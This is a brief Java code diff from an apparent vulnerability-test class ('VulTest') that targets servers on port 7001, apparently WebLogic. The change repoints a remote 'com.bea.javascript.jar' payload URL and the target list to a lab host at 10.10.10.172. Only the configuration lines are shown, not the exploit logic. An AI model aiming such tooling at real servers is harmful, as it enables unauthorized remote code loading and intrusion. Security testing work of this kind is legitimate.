@@ -219,10 +219,11 @@ public class S1274489 implements VulTest {
 
     public static void main(String[] args) throws Exception {
         String url = "http://192.168.1.6:8080/com.bea.javascript.jar";
+        url = "http://10.10.10.172:9999/com.bea.javascript.jar";
         List<String> hostList = new ArrayList();
-        hostList.add("192.168.1.11:7001");
-        hostList.add("192.168.1.9:7001");
-        hostList.add("192.168.1.12:7001");
+        hostList.add("10.10.10.172:7001");
+//        hostList.add("192.168.1.9:7001");
+//        hostList.add("192.168.1.12:7001");
         for (String host:hostList) {
             String ip = host.split(":")[0];
             Integer port = Integer.parseInt(host.split(":")[1]);
